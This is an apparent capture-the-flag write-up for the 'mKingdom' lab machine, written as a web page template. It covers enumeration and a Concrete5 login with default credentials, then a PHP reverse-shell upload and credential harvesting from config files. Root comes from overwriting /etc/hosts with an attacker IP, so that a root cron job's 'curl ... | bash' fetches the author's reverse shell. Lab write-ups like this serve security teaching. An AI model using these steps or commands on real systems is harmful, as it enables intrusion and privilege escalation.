{% from "macros.html" import console, image, text, code, list, link, header, script, imageModal %}

{{imageModal()}}

{{header("Enumeration", "enumeration")}}

{{text("We perform a basic port scan.")}}

{{console("nmap -T5 -p- -sV 10.10.216.30", "Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-20 20:12 CET
Nmap scan report for 10.10.216.30
Host is up (0.080s latency).
PORT   STATE SERVICE VERSION
85/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))

Nmap done: 1 IP address (1 host up)")}}

{{text("We find one open port running an HTTP service.")}}

{{text("At <code class='bg-gray-300 rounded-md px-1'>http://10.10.216.30:85</code>, we are greeted with a taunting message.")}}

{{image("../../static/writeups/mkingdom/images/000001.jpg")}}

{{text("Next, I scanned for hidden directories.")}}

{{console("gobuster dir -u http://10.10.216.30:85 -w /usr/share/wordlists/dirb/common.txt", "===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.216.30:85
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 283]
/.htpasswd            (Status: 403) [Size: 288]
/.htaccess            (Status: 403) [Size: 288]
/app                  (Status: 301) [Size: 312] [--> http://10.10.216.30:85/app/]
/index.html           (Status: 200) [Size: 647]
/server-status        (Status: 403) [Size: 292]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================")}}

{{text("We discover the <code class='bg-gray-300 rounded-md px-1'>/app</code> directory.")}}

{{text("It contains a button that redirects us to <code class='bg-gray-300 rounded-md px-1'>/app/castle</code>.")}}

{{image("../../static/writeups/mkingdom/images/000002.jpg")}}

{{header("Shell as www-data", "asdf")}}

{{text("We identify the CMS as <code class='bg-gray-300 rounded-md px-1'>Concrete5</code> with version <code class='bg-gray-300 rounded-md px-1'>8.5.2</code>.")}}

{{text("We search for an exploit for this version.")}}

{{text("We find this article.")}}

{{link("https://vulners.com/hackerone/H1:768322", "https://vulners.com/favicon.ico", "Concrete CMS: Remote Code Execution (Reverse Shell)")}}

{{text("This exploit requires admin permissions.")}}

{{text("Running <code class='bg-gray-300 rounded-md px-1'>Gobuster</code> again reveals a login page at <code class='bg-gray-300 rounded-md px-1'>/app/castle/index.php/login</code>.")}}

{{image("../../static/writeups/mkingdom/images/000003.jpg")}}

{{text("Normally, I would attempt to brute-force this form, but that's unnecessary here.")}}

{{text("We can search for Concrete 5 default username which is <code class='bg-gray-300 rounded-md px-1'>admin</code> and after guessing the password which is <code class='bg-gray-300 rounded-md px-1'>password</code>, we successfully log in.")}}

{{image("../../static/writeups/mkingdom/images/000004.jpg")}}

{{text("Following the article, we allow PHP files, upload a reverse shell, and execute it.")}}

{{text("In <code class='bg-gray-300 rounded-md px-1'>System & Settings</code>, navigate to <code class='bg-gray-300 rounded-md px-1'>Allowed File Types</code>.")}}

{{text("Add <code class='bg-gray-300 rounded-md px-1'>PHP</code> to the list of allowed file types.")}}

{{image("../../static/writeups/mkingdom/images/000005.jpg")}}

{{text("Next, we upload a <code class='bg-gray-300 rounded-md px-1'>PHP PentestMonkey</code> reverse shell obtained from <code class='bg-gray-300 rounded-md px-1'>revshells.com</code>.")}}

{{image("../../static/writeups/mkingdom/images/000006.jpg")}}

{{text("Once uploaded, we set up a listener and execute the uploaded file by doing to the correct URL.")}}

{{image("../../static/writeups/mkingdom/images/000007.jpg")}}

{{text("This grants us a reverse shell.")}}

{{image("../../static/writeups/mkingdom/images/000008.jpg")}}

{{header("Shell as toad", "shell-as-toad")}}

{{text("In <code class='bg-gray-300 rounded-md px-1'>/var/www/html/app/castle/application/config</code>, we find a <code class='bg-gray-300 rounded-md px-1'>database.php</code> file containing the credentials for the <code class='bg-gray-300 rounded-md px-1'>toad</code> user.")}}

{{image("../../static/writeups/mkingdom/images/000009.jpg")}}

{{header("Shell as mario", "shell-as-mario")}}

{{text("In the current user's home directory, we find a base64-encoded string. Decoding it reveals another user's password.")}}

{{console("cat .bashrc", "...
export PWD_token='[REDACTED]'")}}

{{text("From <code class='bg-gray-300 rounded-md px-1'>/etc/passwd</code>, we identify another user, <code class='bg-gray-300 rounded-md px-1'>mario</code>. Logging in as this user succeeds.")}}

{{header("Shell as root", "shell-as-root")}}

{{text("I couldn't find anything interesting and running <code class='bg-gray-300 rounded-md px-1'>linpeas</code> also didn't help.")}}

{{text("I downloaded <code class='bg-gray-300 rounded-md px-1'>pspy64</code> from my machine using <code class='bg-gray-300 rounded-md px-1'>http.server</code> together with <code class='bg-gray-300 rounded-md px-1'>wget</code> and ran it, trying to see any background processes.")}}

{{text("Remember to be in the <code class='bg-gray-300 rounded-md px-1'>/tmp</code> directory, otherwise you won't have neccessary permissions to write this file.")}}

{{text("We use <code class='bg-gray-300 rounded-md px-1'>chmod +x pspy64</code> and finally run it.")}}

{{console("./pspy64", "...
2024/11/21 10:59:01 CMD: UID=0     PID=2426   | bash 
2024/11/21 10:59:01 CMD: UID=0     PID=2425   | curl mkingdom.thm:85/app/castle/application/counter.sh 
2024/11/21 10:59:01 CMD: UID=0     PID=2424   | /bin/sh -c curl mkingdom.thm:85/app/castle/application/counter.sh | bash >> /var/log/up.log  
2024/11/21 10:59:01 CMD: UID=0     PID=2423   | CRON 
...")}}

{{text("If we were able to modify the <code class='bg-gray-300 rounded-md px-1'>mkingdom.thm</code> ip address to our own, we should be able to download a reverse shell from our machine and execute it instead.")}}

{{text("We have write permissions to <code class='bg-gray-300 rounded-md px-1'>/etc/hosts</code> so we should be able to do just that.")}}

{{console("echo 'OUR_IP' > /etc/hosts")}}

{{image("../../static/writeups/mkingdom/images/000010.jpg")}}

{{text("We have to create the same directories from which the file gets downloaded, so <code class='bg-gray-300 rounded-md px-1'>/app/castle/application</code> and create a reverse shell with the name <code class='bg-gray-300 rounded-md px-1'>counter.sh</code>.")}}

{{text("After that, we run a python http server with <code class='bg-gray-300 rounded-md px-1'>python3 -m http.server 85</code> and wait for our file to get downloaded.")}}

{{text("Remember to use port 85, since it's the port which the curl command uses.")}}

{{console("python3 -m http.server 85", "Serving HTTP on 0.0.0.0 port 85 (http://0.0.0.0:85/) ...
10.10.216.30 - - [21/Nov/2024 17:16:03] 'GET /app/castle/application/counter.sh HTTP/1.1' 200 -")}}

{{text("File gets successfully downloaded, and we get a reverse shell as <code class='bg-gray-300 rounded-md px-1'>root</code>.")}}

{{text("One more thing, we have to use <code class='bg-gray-300 rounded-md px-1'>/usr/lib/klibc/bin/cat</code> instead of just cat to read the flag.")}}

{{text("Alternativally, use <code class='bg-gray-300 rounded-md px-1'>tac root.txt</code>.")}}

{{image("../../static/writeups/mkingdom/images/000011.jpg")}}

{{script()}}